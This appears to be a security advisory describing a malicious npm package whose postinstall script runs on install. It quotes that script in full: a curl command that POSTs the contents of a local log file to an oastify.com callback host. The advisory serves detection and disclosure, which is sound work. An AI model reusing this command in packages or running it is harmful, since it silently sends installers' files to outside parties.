summary: postinstall exfiltrates local file contents to Burp Collaborator endpoint
details: package.json declares a postinstall lifecycle script that runs automatically on `npm install`: `curl -X POST -d "$(cat /data/logs/monitor-2026-06-25.log)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data`. The script reads a file from the installer's filesystem and POSTs its contents over plain HTTP to a Burp Collaborator (oastify.com) subdomain — out-of-band infrastructure used by attackers for exfiltration callbacks. Package metadata reinforces malicious intent: empty author/homepage/repository fields, nonsense package name, and a keyword string resembling a shell-injection probe (`trunls -lae`). No legitimate utility is provided; the package exists solely to execute the install-time exfiltration callback.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
